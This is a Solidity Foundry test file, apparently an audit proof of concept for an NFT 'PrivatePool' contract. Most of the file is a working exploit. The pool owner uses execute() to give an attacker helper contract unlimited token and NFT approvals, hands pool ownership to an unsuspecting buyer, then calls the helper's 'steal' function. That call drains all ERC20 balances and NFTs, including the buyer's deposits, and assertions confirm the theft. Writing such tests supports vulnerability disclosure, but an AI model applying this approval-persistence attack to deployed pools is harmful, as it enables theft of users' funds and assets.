pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/PrivatePool.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC721, ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";

/*//////////////////////////////////////////////////////////////
                            MOCKS
//////////////////////////////////////////////////////////////*/

contract MockERC20 is ERC20 {
    constructor() ERC20("MockToken", "MOCK", 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockERC721 is ERC721 {
    constructor() ERC721("MockNFT", "MNFT") {}

    function mint(address to, uint256 id) external {
        _mint(to, id);
    }

    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

interface IRoyaltyRegistry {
    function getRoyaltyLookupAddress(address) external view returns (address);
}

contract MockRoyaltyRegistry is IRoyaltyRegistry {
    function getRoyaltyLookupAddress(address) external pure returns (address) {
        return address(0);
    }
}

contract MockFactory {
    /* tokenId (=pool address) => owner */
    mapping(uint256 => address) public owners;

    /* protocol fee set to zero for simplicity */
    uint16 public protocolFeeRate = 0;

    function setOwner(uint256 tokenId, address owner) external {
        owners[tokenId] = owner;
    }

    /* ERC721-style ownerOf called from PrivatePool */
    function ownerOf(uint256 tokenId) external view returns (address) {
        return owners[tokenId];
    }
}

/*//////////////////////////////////////////////////////////////
                        MALICIOUS CONTRACT
//////////////////////////////////////////////////////////////*/

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 tokenId,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

/**
 * @notice  Attacker-controlled helper that receives unlimited
 *          allowances from the pool while the attacker is owner.
 *          Later it drains both ERC20 and ERC721 from the pool.
 */
contract AttackContract is ERC721TokenReceiver, IERC3156FlashBorrower {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /* Called by PrivatePool.flashLoan â€“ we do nothing special */
    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure returns (bytes32) {
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /* Drain everything the pool still holds */
    function steal(
        address pool,
        address erc20,
        address erc721,
        uint256[] calldata tokenIds
    ) external {
        require(msg.sender == attacker, "Not attacker");

        /* Drain all ERC20 */
        uint256 bal = ERC20(erc20).balanceOf(pool);
        ERC20(erc20).transferFrom(pool, attacker, bal);

        /* Drain all NFTs */
        for (uint256 i = 0; i < tokenIds.length; i++) {
            ERC721(erc721).safeTransferFrom(pool, attacker, tokenIds[i]);
        }
    }

    /* Accept ERC721 safely */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}

/*//////////////////////////////////////////////////////////////
                         EXPLOIT TEST
//////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    /* Actors */
    address bob   = address(0xB0b);      // original pool owner / attacker
    address alice = address(0xA11cE);    // unsuspecting buyer

    /* Deployed contracts */
    MockFactory          factory;
    MockRoyaltyRegistry  royaltyRegistry;
    address              dummyOracle = address(0xDEAD);
    PrivatePool          pool;
    MockERC20            token;
    MockERC721           nft;
    AttackContract       attackerHelper;

    /* Test state constants */
    uint256 constant INITIAL_ERC20_IN_POOL = 500 ether; // 18 decimals
    uint256 constant ALICE_ERC20_DEPOSIT   = 300 ether;

    /* Bob's & Alice's NFT IDs */
    uint256[] bobNfts  = [uint256(1), 2, 3, 4, 5];
    uint256[] aliceNfts = [uint256(11)];

    function setUp() public {
        /* Deploy mocks */
        factory          = new MockFactory();
        royaltyRegistry  = new MockRoyaltyRegistry();
        token            = new MockERC20();
        nft              = new MockERC721();

        /* Deploy pool through direct constructor */
        pool = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            dummyOracle
        );

        /* Make Bob initial owner of the pool */
        factory.setOwner(uint160(address(pool)), bob);

        /* Mint assets */
        token.mint(bob,   1000 ether);
        token.mint(alice, 1000 ether);

        for (uint256 i = 0; i < bobNfts.length; i++) {
            nft.mint(bob, bobNfts[i]);
        }
        for (uint256 i = 0; i < aliceNfts.length; i++) {
            nft.mint(alice, aliceNfts[i]);
        }

        /* Bob initializes the pool */
        vm.startPrank(bob);
        pool.initialize(
            address(token),          // base token
            address(nft),            // NFT collection
            100 ether,               // virtual base reserves
            10 ether,                // virtual NFT reserves
            1,                       // changeFee
            300,                     // feeRate (3%)
            bytes32(0),              // no merkle root
            false,                   // no stolen oracle
            false                    // no royalties
        );

        /* Bob deposits 5 NFTs + 500 ERC20 */
        token.approve(address(pool), type(uint256).max);
        for (uint256 i = 0; i < bobNfts.length; i++) {
            nft.setApprovalForAll(address(pool), true);
        }
        pool.deposit(bobNfts, INITIAL_ERC20_IN_POOL);

        /* Bob deploys malicious helper and grants approvals via execute() */
        attackerHelper = new AttackContract(bob);

        /* Unlimited ERC20 allowance to attackerHelper */
        pool.execute(
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(attackerHelper),
                type(uint256).max
            )
        );

        /* Grant full NFT control to attackerHelper */
        pool.execute(
            address(nft),
            abi.encodeWithSignature(
                "setApprovalForAll(address,bool)",
                address(attackerHelper),
                true
            )
        );
        vm.stopPrank();

        /**
         * At this point Bob lists/sells the pool-ownership NFT elsewhere.
         * We emulate this by directly changing Factory's owner mapping.
         */
        factory.setOwner(uint160(address(pool)), alice);
    }

    function testExploit() public {
        /* Alice believes she now owns the pool and deposits more assets */
        vm.startPrank(alice);
        token.approve(address(pool), type(uint256).max);
        nft.setApprovalForAll(address(pool), true);

        pool.deposit(aliceNfts, ALICE_ERC20_DEPOSIT);
        vm.stopPrank();

        /* Record pool balances before attack */
        uint256 poolTokenBefore = token.balanceOf(address(pool));
        assertGt(poolTokenBefore, 0); // sanity

        /* --------  Bob steals everything -------- */
        uint256[] memory allIds = new uint256[](bobNfts.length + aliceNfts.length);
        for (uint256 i = 0; i < bobNfts.length; i++) allIds[i] = bobNfts[i];
        for (uint256 i = 0; i < aliceNfts.length; i++) allIds[bobNfts.length + i] = aliceNfts[i];

        vm.prank(bob);
        attackerHelper.steal(address(pool), address(token), address(nft), allIds);

        /* ------------------ Assertions ------------------ */

        /* Pool drained */
        assertEq(token.balanceOf(address(pool)), 0, "Pool ERC20 not drained");

        for (uint256 i = 0; i < allIds.length; i++) {
            assertEq(nft.ownerOf(allIds[i]), bob, "NFT not stolen");
        }

        /* Bob received funds */
        assertEq(
            token.balanceOf(bob),
            1000 ether + poolTokenBefore, // original balance + everything stolen
            "Bob did not get ERC20"
        );
    }
}